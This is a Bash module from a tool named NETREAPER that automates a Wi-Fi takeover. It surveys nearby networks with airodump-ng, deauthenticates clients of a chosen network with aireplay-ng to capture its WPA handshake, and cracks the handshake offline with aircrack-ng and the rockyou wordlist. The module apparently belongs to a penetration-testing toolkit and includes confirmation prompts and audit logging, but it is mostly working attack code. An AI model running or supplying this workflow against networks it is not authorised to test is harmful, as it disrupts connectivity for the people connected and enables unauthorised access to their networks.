#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# NETREAPER - Wireless Takeover Wizard
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Wireless takeover wizard: Wi-Fi survey → deauth to capture handshakes → offline cracking
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_NETREAPER_WIFI_WIZARD_LOADED:-}" ]] && return 0
readonly _NETREAPER_WIFI_WIZARD_LOADED=1

# Source library files
source "${BASH_SOURCE%/*}/../lib/core.sh"
source "${BASH_SOURCE%/*}/../lib/ui.sh"
source "${BASH_SOURCE%/*}/../lib/safety.sh"
source "${BASH_SOURCE%/*}/../lib/detection.sh"
source "${BASH_SOURCE%/*}/../lib/utils.sh"
source "${BASH_SOURCE%/*}/../lib/wireless.sh"

#═══════════════════════════════════════════════════════════════════════════════
# WIFI WIZARD FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Wireless takeover wizard
run_wifi_takeover_wizard() {
    local iface="${1:-}"

    operation_header "Wireless Takeover Wizard" "Automated workflow"

    # Step 1: Select interface
    if [[ -z "$iface" ]]; then
        iface=$(select_wireless_interface)
        if [[ -z "$iface" ]]; then
            log_error "No wireless interface selected"
            return 1
        fi
    fi

    log_info "Starting wireless takeover on interface: $iface"
    echo

    # Step 2: Wi-Fi Survey
    log_info "Step 1/3: Wi-Fi Survey"
    log_info "This scans for nearby wireless networks."
    if ! confirm "Proceed with Wi-Fi survey?" "y"; then
        log_info "Survey skipped"
        return 1
    fi

    local survey_file
    survey_file=$(run_wifi_survey "$iface")
    if [[ -z "$survey_file" ]]; then
        log_error "Wi-Fi survey failed"
        return 1
    fi
    echo

    # Step 3: Select target network
    local bssid essid channel
    if ! select_target_network "$survey_file"; then
        log_error "No target network selected"
        return 1
    fi
    echo

    # Step 4: Deauthentication and Handshake Capture
    log_info "Step 2/3: Deauthentication & Handshake Capture"
    log_info "This will deauthenticate clients to capture WPA handshakes."
    if ! confirm "Proceed with deauthentication? (May disrupt connectivity)" "n"; then
        log_info "Deauthentication skipped"
        return 1
    fi

    local handshake_file
    handshake_file=$(run_deauth_capture "$iface" "$bssid" "$channel")
    if [[ -z "$handshake_file" ]]; then
        log_error "Handshake capture failed"
        return 1
    fi
    echo

    # Step 5: Offline Cracking
    log_info "Step 3/3: Offline Cracking"
    log_info "This cracks the captured handshake using wordlists."
    if ! confirm "Proceed with cracking? (May take time)" "y"; then
        log_info "Cracking skipped"
    else
        run_offline_crack "$handshake_file" "$essid"
    fi
    echo

    operation_summary "success" "Wireless takeover wizard complete" "Review outputs in $OUTPUT_DIR"
    log_audit "WIFI_WIZARD" "$iface" "success"
}

# Wi-Fi survey
run_wifi_survey() {
    local iface="$1"

    if ! check_monitor_mode "$iface"; then
        log_info "Enabling monitor mode on $iface"
        enable_monitor_mode "$iface" || return 1
    fi

    local outfile
    outfile="${OUTPUT_DIR}/wifi_survey_$(timestamp_filename).csv"

    operation_header "Wi-Fi Survey" "$iface"
    log_command_preview "airodump-ng --output-format csv -w survey \"$iface\""
    log_info "Scanning for networks..."

    timeout 30 airodump-ng --output-format csv -w "${OUTPUT_DIR}/survey" "$iface" >/dev/null 2>&1
    local exit_code=$?

    if [[ $exit_code -eq 0 ]] || [[ $exit_code -eq 124 ]]; then
        mv "${OUTPUT_DIR}/survey-01.csv" "$outfile" 2>/dev/null
        operation_summary "success" "Survey complete" "Output: $outfile"
        echo "$outfile"
    else
        operation_summary "failed" "Survey failed"
        return 1
    fi
}

# Select target network from survey
select_target_network() {
    local survey_file="$1"

    if [[ ! -f "$survey_file" ]]; then
        log_error "Survey file not found"
        return 1
    fi

    log_info "Available networks:"
    awk -F',' 'NR>2 && NF>13 {print NR-2 ": " $14 " (" $1 ") Ch:" $4 " Enc:" $6}' "$survey_file" | head -10

    local choice
    choice=$(get_input "Select network number (1-10)")

    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]]; then
        return 1
    fi

    local line
    line=$((choice + 2))
    bssid=$(awk -F',' "NR==$line {print \$1}" "$survey_file")
    essid=$(awk -F',' "NR==$line {print \$14}" "$survey_file")
    channel=$(awk -F',' "NR==$line {print \$4}" "$survey_file")

    if [[ -z "$bssid" ]]; then
        log_error "Invalid selection"
        return 1
    fi

    log_info "Selected: $essid ($bssid) on channel $channel"
    return 0
}

# Deauthentication and capture
run_deauth_capture() {
    local iface="$1" bssid="$2" channel="$3"

    local mon_iface="${iface}mon"
    local outfile="${OUTPUT_DIR}/handshake_${bssid//:/}_$(timestamp_filename).cap"

    operation_header "Handshake Capture" "$bssid"
    log_command_preview "airodump-ng -c \"$channel\" --bssid \"$bssid\" -w handshake \"$mon_iface\" & aireplay-ng -0 5 -a \"$bssid\" \"$mon_iface\""
    log_info "Capturing handshakes..."

    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "${OUTPUT_DIR}/handshake" "$mon_iface" >/dev/null 2>&1 &
    local dump_pid=$!

    # Deauth
    aireplay-ng -0 5 -a "$bssid" "$mon_iface" >/dev/null 2>&1
    local exit_code=$?

    # Wait a bit for capture
    sleep 10
    kill $dump_pid 2>/dev/null

    if [[ $exit_code -eq 0 ]]; then
        mv "${OUTPUT_DIR}/handshake-01.cap" "$outfile" 2>/dev/null
        operation_summary "success" "Capture complete" "Output: $outfile"
        echo "$outfile"
    else
        operation_summary "failed" "Capture failed"
        return 1
    fi
}

# Offline cracking
run_offline_crack() {
    local cap_file="$1" essid="$2"

    if ! check_tool "aircrack-ng"; then
        log_error "aircrack-ng is not installed"
        return 1
    fi

    local wordlist="/usr/share/wordlists/rockyou.txt"
    local outfile="${OUTPUT_DIR}/crack_${essid}_$(timestamp_filename).txt"

    operation_header "Offline Cracking" "$essid"
    log_command_preview "aircrack-ng -w \"$wordlist\" -b <bssid> \"$cap_file\""
    log_info "Cracking handshake..."

    # Extract bssid from cap file or assume
    aircrack-ng -w "$wordlist" "$cap_file" | tee "$outfile"
    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        operation_summary "success" "Cracking complete" "Output: $outfile"
    else
        operation_summary "failed" "Cracking failed"
    fi

    return $exit_code
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

export -f run_wifi_takeover_wizard run_wifi_survey select_target_network run_deauth_capture run_offline_crack